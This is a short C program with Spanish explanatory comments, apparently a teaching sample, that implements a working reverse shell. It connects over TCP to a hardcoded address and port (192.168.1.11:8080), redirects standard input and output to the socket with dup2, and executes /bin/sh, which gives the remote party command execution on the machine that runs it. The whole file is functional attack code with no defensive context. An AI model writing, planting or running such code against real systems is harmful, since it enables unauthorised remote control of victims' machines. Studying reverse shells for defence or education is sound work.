#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define REMOTE_ADDR "192.168.1.11"
#define REMOTE_PORT 8080

int main(int argc, char *argv[]){
	struct sockaddr_in parametros_red;
	int Socket;
 
	//IPv4
	parametros_red.sin_family = AF_INET;
	//Dirección remota
	parametros_red.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	//Puerto remoto
	parametros_red.sin_port = htons(REMOTE_PORT);
	
	//Creación del Socket (descriptor de archivo) con IPV4 y usando protocolo TCP (SOCK_STREAM)
	Socket = socket(AF_INET, SOCK_STREAM, 0);

	//Se establece la conexión con los parámetros previos
	connect(Socket, (struct sockaddr *)&parametros_red, sizeof(parametros_red));
										    
	//Utilizamos la función dup2 para duplicar el descriptor de archivo para redireccionar las entradas,
	//salidas y errores
	
	//Redirecciona la entrada estándar (stdin) al socket, es decir; cualquier entrada del proceso será 
	//recibida por el Socket
	dup2(Socket, 0);

	//Redirecciona la salida estándar (stdout) al socket, es decir; cualquier salida del proceso será
	//enviada por el Socket
	dup2(Socket, 1);

	//Ejecuta una shell a través del proceso actual que se comunica por el Socket
	execve("/bin/sh", 0, 0);
	return 0;
}
